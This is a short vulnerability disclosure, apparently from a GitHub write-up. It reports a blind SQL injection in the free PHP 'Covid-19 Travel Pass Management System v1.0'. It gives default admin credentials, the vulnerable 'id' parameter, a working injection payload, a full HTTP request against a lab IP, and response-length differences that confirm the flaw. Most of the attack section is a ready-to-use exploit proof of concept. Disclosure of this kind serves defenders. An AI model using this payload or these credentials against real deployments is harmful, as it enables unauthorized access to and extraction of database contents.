# Covid-19 Travel Pass Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: /ctpms/admin/?page=user/manage_user&id=

Vulnerability location: /ctpms/admin/?page=user/manage_user&id=,id

[+] Payload: /ctpms/admin/?page=user/manage_user&id=3%27%20and%20length(database())%20=8--+ // Leak place ---> id

Current database name: ctpms_db,length is 8

```sql
GET /ctpms/admin/?page=user/manage_user&id=3%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=sbd29ujtf9eelnf4f6rlt8ikfi
Connection: close
```

When length (database ()) = 7, Content-Length: 25990

![image](https://user-images.githubusercontent.com/54017627/167083259-62da61e3-b0e0-4182-938e-acae5998fce1.png)

![image](https://user-images.githubusercontent.com/54017627/167083168-9c59b063-26f1-4485-97ca-3e6a69ed6b52.png)

When length (database ()) = 8, Content-Length: 25957

![image](https://user-images.githubusercontent.com/54017627/167083205-c5fc1854-3e9c-43d5-b794-95e28566c429.png)

![image](https://user-images.githubusercontent.com/54017627/167083107-d427bb82-4dbe-4555-92c8-30add9d329b8.png)
